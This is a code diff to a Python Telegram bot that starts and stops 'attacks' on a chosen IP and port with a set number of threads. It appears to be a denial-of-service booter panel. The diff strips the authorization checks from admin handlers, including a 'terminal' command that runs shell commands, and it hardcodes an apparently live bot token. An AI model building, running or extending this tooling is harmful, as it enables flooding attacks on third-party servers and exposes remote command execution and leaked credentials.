@@ -1,9 +1,9 @@
 import os
 import asyncio
 import socket
+import psutil  # <-- Added
 from telegram import Update, ReplyKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackContext, MessageHandler, filters
-from telegram.error import TelegramError
 
 # Bot setup
 TELEGRAM_BOT_TOKEN = '7694477480:AAHfV8Ih8LWcf4CwuqsdhRZmPzZZtUXOyaM'
@@ -12,7 +12,7 @@ authorized_users = {OWNER_USER_ID}
 
 # Default config for attacks
 default_duration = 60  # seconds
-default_threads = 1000   # threads
+default_threads = 500   # threads
 
 # Track running attacks
 running_attacks = {}
@@ -35,9 +35,7 @@ async def start(update: Update, context: CallbackContext):
 
     chat_id = update.effective_chat.id
 
-    keyboard = [
-        ["/attack", "/stop"]
-    ]
+    keyboard = [[ "/attack", "/stop" ]]
     reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
 
     message = (
@@ -105,12 +103,10 @@ async def handle_attack_input(update: Update, context: CallbackContext):
 
     await context.bot.send_message(
         chat_id=chat_id,
-        text=(
-            f"*⚔️ Attack Started! ⚔️*\n"
-            f"*🎯 Target: {ip}:{port}*\n"
-            f"*🕒 Duration: {duration} seconds*\n"
-            f"*🔁 Threads: {threads}*"
-        ),
+        text=(f"*⚔️ Attack Started! ⚔️*\n"
+              f"*🎯 Target: {ip}:{port}*\n"
+              f"*🕒 Duration: {duration} seconds*\n"
+              f"*🔁 Threads: {threads}*"),
         parse_mode='Markdown'
     )
 
@@ -125,18 +121,22 @@ async def stop_attack(update: Update, context: CallbackContext):
     process = running_attacks.get(user_id)
     if process and process.returncode is None:
         try:
-            process.terminate()
-            await context.bot.send_message(chat_id=chat_id, text="*🛑 Attack stopped successfully.*", parse_mode='Markdown')
+            # Use psutil to terminate all child processes
+            parent = psutil.Process(process.pid)
+            for child in parent.children(recursive=True):
+                child.kill()
+            parent.kill()
+
+            await context.bot.send_message(chat_id=chat_id, text="*🛑 Attack forcefully stopped.*", parse_mode='Markdown')
         except Exception as e:
-            await context.bot.send_message(chat_id=chat_id, text=f"*❌ Failed to stop attack:* `{str(e)}`", parse_mode='Markdown')
+            await context.bot.send_message(chat_id=chat_id, text=f"*❌ Error stopping attack:* `{str(e)}`", parse_mode='Markdown')
         finally:
             running_attacks.pop(user_id, None)
     else:
         await context.bot.send_message(chat_id=chat_id, text="*ℹ️ No running attack to stop.*", parse_mode='Markdown')
 
+# Admin commands
 async def set_duration(update: Update, context: CallbackContext):
-    if await deny_if_not_allowed(update, context): return
-
     global default_duration
     chat_id = update.effective_chat.id
     user_id = update.effective_user.id
@@ -153,8 +153,6 @@ async def set_duration(update: Update, context: CallbackContext):
     await context.bot.send_message(chat_id=chat_id, text=f"*✅ Max duration set to {default_duration} seconds.*", parse_mode='Markdown')
 
 async def set_threads(update: Update, context: CallbackContext):
-    if await deny_if_not_allowed(update, context): return
-
     global default_threads
     chat_id = update.effective_chat.id
     user_id = update.effective_user.id
@@ -171,8 +169,6 @@ async def set_threads(update: Update, context: CallbackContext):
     await context.bot.send_message(chat_id=chat_id, text=f"*✅ Max threads set to {default_threads}.*", parse_mode='Markdown')
 
 async def add_user(update: Update, context: CallbackContext):
-    if await deny_if_not_allowed(update, context): return
-
     chat_id = update.effective_chat.id
     user_id = update.effective_user.id
 
@@ -189,8 +185,6 @@ async def add_user(update: Update, context: CallbackContext):
     await context.bot.send_message(chat_id=chat_id, text=f"*✅ User `{new_user_id}` added.*", parse_mode='Markdown')
 
 async def remove_user(update: Update, context: CallbackContext):
-    if await deny_if_not_allowed(update, context): return
-
     chat_id = update.effective_chat.id
     user_id = update.effective_user.id
 
@@ -210,8 +204,6 @@ async def remove_user(update: Update, context: CallbackContext):
         await context.bot.send_message(chat_id=chat_id, text="*⚠️ User not found.*", parse_mode='Markdown')
 
 async def terminal(update: Update, context: CallbackContext):
-    if await deny_if_not_allowed(update, context): return
-
     chat_id = update.effective_chat.id
     user_id = update.effective_user.id
 
@@ -241,7 +233,6 @@ async def terminal(update: Update, context: CallbackContext):
             output = output[:4000] + "\n... (truncated)"
 
         await context.bot.send_message(chat_id=chat_id, text=f"```\n{output}\n```", parse_mode='Markdown')
-
     except Exception as e:
         await context.bot.send_message(chat_id=chat_id, text=f"*❌ Error:* `{str(e)}`", parse_mode='Markdown')
 
@@ -257,10 +248,9 @@ def main():
     application.add_handler(CommandHandler("adduser", add_user))
     application.add_handler(CommandHandler("removeuser", remove_user))
 
-    application.add_handler(MessageHandler(filters.Text() & ~filters.Command(), handle_attack_input))
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_attack_input))
 
     application.run_polling()
 
 if __name__ == '__main__':
     main()
-
